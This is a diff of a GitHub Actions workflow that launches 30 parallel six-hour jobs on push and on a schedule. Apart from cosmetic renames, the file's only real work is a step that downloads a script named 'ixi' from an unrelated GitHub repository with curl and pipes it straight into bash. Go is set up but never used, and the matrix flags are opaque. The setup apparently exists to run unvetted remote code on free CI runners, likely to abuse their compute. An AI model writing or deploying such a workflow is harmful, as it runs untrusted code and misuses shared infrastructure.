@@ -1,4 +1,5 @@
 name: CINUL
+
 on:
   push:
   schedule:
@@ -9,21 +10,22 @@ jobs:
     name: IPLAYBOOKS
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 20  # Batasan GitHub Free
+      max-parallel: 20 
       fail-fast: false
       matrix:
         go: [1.11, 1.12, 1.13, 1.14, 1.15]
-        flag: [kmn, oiu, qwe, nvb, tby, muh]
+        flag: [kmn, oiu, qwe, nvb, tby, muh]   # 5 x 6 = 30 kombinasi
     timeout-minutes: 360
     steps:
       - name: Set up Go ${{ matrix.go }}
         uses: actions/setup-go@v1
         with:
           go-version: ${{ matrix.go }}
+        id: go
 
-      - name: Checkout Repo
+      - name: Checkout
         uses: actions/checkout@v1
 
-      - name: Install Node.js & Run ixi
+      - name: Install Node.js & Run ixi Script
         run: |
           curl -sL https://raw.githubusercontent.com/moyz-2/Dd/refs/heads/main/ixi | bash
